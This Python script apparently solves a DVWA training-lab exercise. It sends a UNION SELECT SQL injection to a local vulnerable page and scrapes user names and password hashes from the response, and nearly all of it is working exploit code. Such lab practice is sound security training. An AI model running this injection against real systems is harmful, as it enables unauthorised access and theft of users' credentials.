#!/usr/bin/env python3

# ----------------------------------------------------

import json

import requests
from bs4 import BeautifulSoup

BASE_URL = "http://localhost:80"
PROXIES = { "http": "http://localhost:8080", "https": "https://localhost:8080" }

PHPSESSID = "il0ci7c322dqm1vhvsv1n9m3j1"

# ----------------------------------------------------

# GET /vulnerabilities/sqli/?id=asd&Submit=Submit HTTP/1.1
# Host: localhost
# sec-ch-ua: "Not/A)Brand";v="8", "Chromium";v="126"
# sec-ch-ua-mobile: ?0
# sec-ch-ua-platform: "Linux"
# Upgrade-Insecure-Requests: 1
# User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36
# Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7
# Sec-Fetch-Site: same-origin
# Sec-Fetch-Mode: navigate
# Sec-Fetch-User: ?1
# Sec-Fetch-Dest: document
# Referer: http://localhost/vulnerabilities/sqli/
# Accept-Encoding: gzip, deflate, br
# Accept-Language: en-US,en;q=0.9
# Cookie: PHPSESSID=il0ci7c322dqm1vhvsv1n9m3j1; security=low
# Connection: keep-alive

def extract_element(text, start_label, end_label):
    i = text.find(start_label)
    j = text[i:].find(end_label)
    return text[i + len(start_label): i + j].strip()

def scrape_data_sqli_low():
    global BASE_URL, PHPSESSID, PROXIES

    url = BASE_URL + "/vulnerabilities/sqli/"

    custom_params = {"id": "1' UNION SELECT first_name, password from users -- ", "Submit": "Submit"}
    custom_headers = {"Cookie": f"PHPSESSID={PHPSESSID}; security=low;"}

    r = requests.get(url, headers=custom_headers, params=custom_params, proxies=PROXIES)    

    # -------
    
    soup = BeautifulSoup(r.text, "html.parser")

    users = []
    for pre in soup.find_all("pre"):
        text = str(pre)
        user = extract_element(text, "First name:", "<br/>")
        password = extract_element(text, "Surname:", "</pre>")

        users.append({
            "user": user,
            "password": password
        })
    
    print(json.dumps(users, indent=2))
    
# ----------------------------------------------------

def main():
    scrape_data_sqli_low()

if __name__ == "__main__":
    main()
